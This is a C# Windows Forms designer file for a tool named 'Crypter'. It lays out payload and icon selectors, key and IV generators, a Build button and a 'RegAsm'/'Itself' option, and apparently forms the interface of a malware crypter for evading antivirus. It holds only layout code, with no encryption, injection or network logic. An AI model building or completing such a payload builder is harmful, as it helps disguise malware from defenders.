namespace Crypter
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.panel2 = new System.Windows.Forms.Panel();
            this.label6 = new System.Windows.Forms.Label();
            this.btnServer = new System.Windows.Forms.Button();
            this.btnIcon = new System.Windows.Forms.Button();
            this.txtPayload = new System.Windows.Forms.TextBox();
            this.txtIcon = new System.Windows.Forms.TextBox();
            this.btnBuild = new System.Windows.Forms.Button();
            this.labelServer = new System.Windows.Forms.Label();
            this.labelIcon = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.txtKeyGen = new System.Windows.Forms.TextBox();
            this.btnKeyGen = new System.Windows.Forms.Button();
            this.label5 = new System.Windows.Forms.Label();
            this.txtIVGen = new System.Windows.Forms.TextBox();
            this.btnIVGen = new System.Windows.Forms.Button();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.Payload = new System.Windows.Forms.GroupBox();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.radioButton2 = new System.Windows.Forms.RadioButton();
            this.radioButton1 = new System.Windows.Forms.RadioButton();
            this.texttest = new System.Windows.Forms.TextBox();
            this.panel2.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.Payload.SuspendLayout();
            this.groupBox1.SuspendLayout();
            this.SuspendLayout();
            // 
            // panel2
            // 
            this.panel2.BackColor = System.Drawing.SystemColors.AppWorkspace;
            this.panel2.Controls.Add(this.label6);
            this.panel2.Dock = System.Windows.Forms.DockStyle.Top;
            this.panel2.Location = new System.Drawing.Point(0, 0);
            this.panel2.Name = "panel2";
            this.panel2.Size = new System.Drawing.Size(740, 47);
            this.panel2.TabIndex = 0;
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.Font = new System.Drawing.Font("Microsoft Sans Serif", 13.8F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label6.Location = new System.Drawing.Point(12, 9);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(98, 29);
            this.label6.TabIndex = 3;
            this.label6.Text = "Crypter";
            // 
            // btnServer
            // 
            this.btnServer.AccessibleName = "";
            this.btnServer.Location = new System.Drawing.Point(616, 41);
            this.btnServer.Name = "btnServer";
            this.btnServer.Size = new System.Drawing.Size(99, 33);
            this.btnServer.TabIndex = 1;
            this.btnServer.Text = "Select";
            this.btnServer.UseVisualStyleBackColor = true;
            this.btnServer.Click += new System.EventHandler(this.btnServer_Click);
            // 
            // btnIcon
            // 
            this.btnIcon.AccessibleName = "";
            this.btnIcon.Location = new System.Drawing.Point(616, 103);
            this.btnIcon.Name = "btnIcon";
            this.btnIcon.Size = new System.Drawing.Size(99, 33);
            this.btnIcon.TabIndex = 1;
            this.btnIcon.Text = "Select";
            this.btnIcon.UseVisualStyleBackColor = true;
            this.btnIcon.Click += new System.EventHandler(this.btnIcon_Click);
            // 
            // txtPayload
            // 
            this.txtPayload.AccessibleName = "";
            this.txtPayload.Location = new System.Drawing.Point(129, 41);
            this.txtPayload.Multiline = true;
            this.txtPayload.Name = "txtPayload";
            this.txtPayload.Size = new System.Drawing.Size(462, 33);
            this.txtPayload.TabIndex = 2;
            this.txtPayload.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.txtPayload.TextChanged += new System.EventHandler(this.txtServer_TextChanged);
            // 
            // txtIcon
            // 
            this.txtIcon.AccessibleName = "";
            this.txtIcon.Location = new System.Drawing.Point(129, 103);
            this.txtIcon.Multiline = true;
            this.txtIcon.Name = "txtIcon";
            this.txtIcon.Size = new System.Drawing.Size(462, 33);
            this.txtIcon.TabIndex = 2;
            this.txtIcon.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // btnBuild
            // 
            this.btnBuild.AccessibleName = "";
            this.btnBuild.Enabled = false;
            this.btnBuild.Location = new System.Drawing.Point(616, 426);
            this.btnBuild.Name = "btnBuild";
            this.btnBuild.Size = new System.Drawing.Size(99, 35);
            this.btnBuild.TabIndex = 1;
            this.btnBuild.Text = "Build";
            this.btnBuild.UseVisualStyleBackColor = true;
            this.btnBuild.Click += new System.EventHandler(this.btnBuild_Click);
            // 
            // labelServer
            // 
            this.labelServer.AutoSize = true;
            this.labelServer.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.2F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.labelServer.Location = new System.Drawing.Point(38, 54);
            this.labelServer.Name = "labelServer";
            this.labelServer.Size = new System.Drawing.Size(73, 20);
            this.labelServer.TabIndex = 3;
            this.labelServer.Text = "Payload:";
            // 
            // labelIcon
            // 
            this.labelIcon.AutoSize = true;
            this.labelIcon.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.2F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.labelIcon.Location = new System.Drawing.Point(66, 116);
            this.labelIcon.Name = "labelIcon";
            this.labelIcon.Size = new System.Drawing.Size(45, 20);
            this.labelIcon.TabIndex = 3;
            this.labelIcon.Text = "Icon:";
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.2F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label4.Location = new System.Drawing.Point(38, 65);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(73, 20);
            this.label4.TabIndex = 6;
            this.label4.Text = "KeyGen:";
            // 
            // txtKeyGen
            // 
            this.txtKeyGen.AccessibleName = "";
            this.txtKeyGen.Location = new System.Drawing.Point(129, 52);
            this.txtKeyGen.Multiline = true;
            this.txtKeyGen.Name = "txtKeyGen";
            this.txtKeyGen.Size = new System.Drawing.Size(462, 33);
            this.txtKeyGen.TabIndex = 5;
            this.txtKeyGen.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            // 
            // btnKeyGen
            // 
            this.btnKeyGen.AccessibleName = "";
            this.btnKeyGen.Location = new System.Drawing.Point(616, 52);
            this.btnKeyGen.Name = "btnKeyGen";
            this.btnKeyGen.Size = new System.Drawing.Size(99, 33);
            this.btnKeyGen.TabIndex = 4;
            this.btnKeyGen.Text = "Generate";
            this.btnKeyGen.UseVisualStyleBackColor = true;
            this.btnKeyGen.Click += new System.EventHandler(this.btnKeyGen_Click);
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.2F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label5.Location = new System.Drawing.Point(51, 127);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(60, 20);
            this.label5.TabIndex = 9;
            this.label5.Text = "IVGen:";
            this.label5.Click += new System.EventHandler(this.label5_Click);
            // 
            // txtIVGen
            // 
            this.txtIVGen.AccessibleName = "";
            this.txtIVGen.Location = new System.Drawing.Point(129, 114);
            this.txtIVGen.Multiline = true;
            this.txtIVGen.Name = "txtIVGen";
            this.txtIVGen.Size = new System.Drawing.Size(462, 33);
            this.txtIVGen.TabIndex = 8;
            this.txtIVGen.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.txtIVGen.TextChanged += new System.EventHandler(this.textBox1_TextChanged);
            // 
            // btnIVGen
            // 
            this.btnIVGen.AccessibleName = "";
            this.btnIVGen.Location = new System.Drawing.Point(616, 114);
            this.btnIVGen.Name = "btnIVGen";
            this.btnIVGen.Size = new System.Drawing.Size(99, 33);
            this.btnIVGen.TabIndex = 7;
            this.btnIVGen.Text = "Generate";
            this.btnIVGen.UseVisualStyleBackColor = true;
            this.btnIVGen.Click += new System.EventHandler(this.button1_Click);
            // 
            // groupBox2
            // 
            this.groupBox2.Controls.Add(this.txtIVGen);
            this.groupBox2.Controls.Add(this.btnKeyGen);
            this.groupBox2.Controls.Add(this.label5);
            this.groupBox2.Controls.Add(this.txtKeyGen);
            this.groupBox2.Controls.Add(this.label4);
            this.groupBox2.Controls.Add(this.btnIVGen);
            this.groupBox2.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.2F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.groupBox2.Location = new System.Drawing.Point(0, 214);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new System.Drawing.Size(740, 168);
            this.groupBox2.TabIndex = 14;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Generate Key an IV";
            // 
            // Payload
            // 
            this.Payload.Controls.Add(this.txtIcon);
            this.Payload.Controls.Add(this.btnServer);
            this.Payload.Controls.Add(this.btnIcon);
            this.Payload.Controls.Add(this.labelIcon);
            this.Payload.Controls.Add(this.txtPayload);
            this.Payload.Controls.Add(this.labelServer);
            this.Payload.Font = new System.Drawing.Font("Microsoft Sans Serif", 10.2F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Payload.Location = new System.Drawing.Point(0, 53);
            this.Payload.Name = "Payload";
            this.Payload.Size = new System.Drawing.Size(740, 155);
            this.Payload.TabIndex = 15;
            this.Payload.TabStop = false;
            this.Payload.Text = "Payload";
            // 
            // groupBox1
            // 
            this.groupBox1.Controls.Add(this.radioButton2);
            this.groupBox1.Controls.Add(this.radioButton1);
            this.groupBox1.Location = new System.Drawing.Point(0, 388);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new System.Drawing.Size(249, 81);
            this.groupBox1.TabIndex = 16;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "groupBox1";
            // 
            // radioButton2
            // 
            this.radioButton2.AutoSize = true;
            this.radioButton2.Location = new System.Drawing.Point(17, 55);
            this.radioButton2.Name = "radioButton2";
            this.radioButton2.Size = new System.Drawing.Size(55, 20);
            this.radioButton2.TabIndex = 1;
            this.radioButton2.Text = "Itself";
            this.radioButton2.UseVisualStyleBackColor = true;
            this.radioButton2.CheckedChanged += new System.EventHandler(this.radioButton2_CheckedChanged);
            // 
            // radioButton1
            // 
            this.radioButton1.AutoSize = true;
            this.radioButton1.Checked = true;
            this.radioButton1.Location = new System.Drawing.Point(17, 22);
            this.radioButton1.Name = "radioButton1";
            this.radioButton1.Size = new System.Drawing.Size(81, 20);
            this.radioButton1.TabIndex = 0;
            this.radioButton1.TabStop = true;
            this.radioButton1.Text = "RegAsm";
            this.radioButton1.UseVisualStyleBackColor = true;
            this.radioButton1.CheckedChanged += new System.EventHandler(this.radioButton1_CheckedChanged);
            // 
            // texttest
            // 
            this.texttest.Location = new System.Drawing.Point(316, 407);
            this.texttest.Name = "texttest";
            this.texttest.Size = new System.Drawing.Size(237, 22);
            this.texttest.TabIndex = 17;
            // 
            // Form1
            // 
            this.ClientSize = new System.Drawing.Size(740, 473);
            this.Controls.Add(this.texttest);
            this.Controls.Add(this.groupBox1);
            this.Controls.Add(this.Payload);
            this.Controls.Add(this.groupBox2);
            this.Controls.Add(this.btnBuild);
            this.Controls.Add(this.panel2);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Name = "Form1";
            this.panel2.ResumeLayout(false);
            this.panel2.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.groupBox2.PerformLayout();
            this.Payload.ResumeLayout(false);
            this.Payload.PerformLayout();
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        
        private System.Windows.Forms.TextBox txtServer_path;
        private System.Windows.Forms.TextBox txtIcon_path;
        private System.Windows.Forms.Panel panel1;
        private System.Windows.Forms.Label label1;
        private System.Windows.Forms.Label label2;
        private System.Windows.Forms.Label label3;
        private System.Windows.Forms.Panel panel2;
        private System.Windows.Forms.Label label6;
        private System.Windows.Forms.Button btnServer;
        private System.Windows.Forms.Button btnIcon;
        private System.Windows.Forms.TextBox txtPayload;
        private System.Windows.Forms.TextBox txtIcon;
        private System.Windows.Forms.Button btnBuild;
        private System.Windows.Forms.Label labelServer;
        private System.Windows.Forms.Label labelIcon;
        private System.Windows.Forms.Label label4;
        private System.Windows.Forms.TextBox txtKeyGen;
        private System.Windows.Forms.Button btnKeyGen;
        private System.Windows.Forms.Label label5;
        private System.Windows.Forms.TextBox txtIVGen;
        private System.Windows.Forms.Button btnIVGen;
        private System.Windows.Forms.GroupBox groupBox2;
        private System.Windows.Forms.GroupBox Payload;
        private System.Windows.Forms.GroupBox groupBox1;
        private System.Windows.Forms.RadioButton radioButton2;
        private System.Windows.Forms.RadioButton radioButton1;
        private System.Windows.Forms.TextBox texttest;
    }
}

